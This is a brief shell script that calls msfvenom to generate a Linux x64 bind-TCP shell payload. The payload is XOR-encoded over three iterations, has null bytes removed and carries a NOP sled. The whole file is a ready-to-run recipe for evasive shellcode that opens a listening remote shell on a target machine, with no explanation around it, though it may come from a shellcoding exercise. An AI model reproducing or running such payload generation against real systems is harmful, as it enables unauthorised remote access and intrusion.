#!/bin/sh

PLATFROM="linux"
ARCH="x64"
ENCODER="$ARCH/xor"
PAYLOAD="$PLATFROM/$ARCH/shell/bind_tcp"
ITERATIONS=3
BAD_CHARS="\\x00"
NOPSLED="40"

msfvenom \
    --platform   $PLATFROM   \
    --arch       $ARCH       \
    --encoder    $ENCODER    \
    --payload    $PAYLOAD    \
    --iterations $ITERATIONS \
    --bad-chars  $BAD_CHARS  \
    --nopsled    $NOPSLED    \
